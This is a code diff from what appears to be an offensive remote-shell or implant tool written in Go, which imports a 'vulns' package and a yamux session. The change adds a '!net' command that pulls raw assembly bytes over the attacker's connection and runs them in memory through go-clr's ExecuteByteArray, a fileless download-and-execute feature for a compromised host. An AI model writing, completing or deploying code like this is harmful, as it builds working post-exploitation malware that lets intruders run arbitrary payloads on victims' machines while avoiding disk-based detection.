@@ -17,6 +17,7 @@ import (
 	"../utils"
 	"../vulns"
 	"github.com/hashicorp/yamux"
+	"github.com/ropnop/go-clr"
 )
 
 // Run runs the mainloop of the shell
@@ -202,21 +203,20 @@ func Run(s *yamux.Session, c net.Conn) {
 				}
 				prompt(c)
 			case "!net":
+				// this does not capture output yet, so you have to write to a file
 				if len(argv) > 2 {
 					assembly := argv[1]
 					args := argv[1:]
-					_ = assembly
-					_ = args
-					// Todo: load file over network & store bytes
-					// clr "github.com/ropnop/go-clr"
-					/*
-						[]byte assBytes
-						ret, err := clr.ExecuteByteArray(v2, assBytes, args)
-						if err != nil {
-							log.Fatal(err)
-						}
-						fmt.Printf("[*] %s returned %d\n", assembly, ret)
-					*/
+					bytes, _ := utils.UploadConnectRaw(s)
+
+					// Todo: capture output somehow
+					ret, err := clr.ExecuteByteArray("v4", bytes, args)
+					if err != nil {
+						log.Fatal(err)
+					}
+					// Todo: remove debug print
+					fmt.Printf("Debug: %s returned %d\n", assembly, ret)
+					//c.Write([]byte(out))
 				} else {
 					c.Write([]byte("!net <sample.exe> <arg1> <arg2> ..."))
 				}
